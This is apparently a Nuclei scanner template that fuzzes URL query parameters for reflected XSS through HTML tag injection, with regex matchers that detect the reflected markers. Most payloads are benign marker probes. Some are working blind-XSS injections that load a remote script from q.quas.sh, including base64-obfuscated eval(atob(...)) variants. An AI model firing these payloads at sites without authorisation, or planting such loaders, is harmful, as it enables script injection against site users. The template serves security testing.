http:
- fuzzing:
  - fuzz:
    - '{{url_encode(xss_payloads)}}'
    - '{{url_encode(url_encode(xss_payloads))}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - (?i)<xsg>al\('xs'\)</xsg>(?:<[^>]+>)*$
    - (?i)<xsg>al\('xs'\)(?:<[^>]+>)*$
    - (?i)<[^>]*xsg x="y" onscrollsend="alert\(1\)"[^>]*>
    - (?i)<[^>]*xsg x='y' onscrollsend='alert\(1\)'[^>]*>
    type: regex
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    xss_payloads:
    - <xsg>al('xs')</xsg>
    - <xsg>al('xs')
    - <x<xsg>sg>al('xs')
    - '"><xsg x="y" onscrollsend="alert(1)">'
    - '''><xsg x=''y'' onscrollsend=''alert(1)''>'
    - </script><xsg x="y" onscrollsend="alert(1)">
    - </sc</script>ript><xs<xsg> x="y" onscrollsend="alert(1)">
    - '"><script src=//q.quas.sh></script>'
    - '''><script src=//q.quas.sh></script>'
    - '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcS5xdWFzLnNoIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;
      autofocus>'
    - '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcS5xdWFzLnNoIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;
      onerror=eval(atob(this.id))>'
id: xss-fuzz-html-tag-injection
info:
  author: quas
  description: Fuzzes all query parameters for various reflected XSS vulnerabilities
    via HTML tag injections.
  name: Reflected XSS Checks via HTML tag injections
  severity: medium
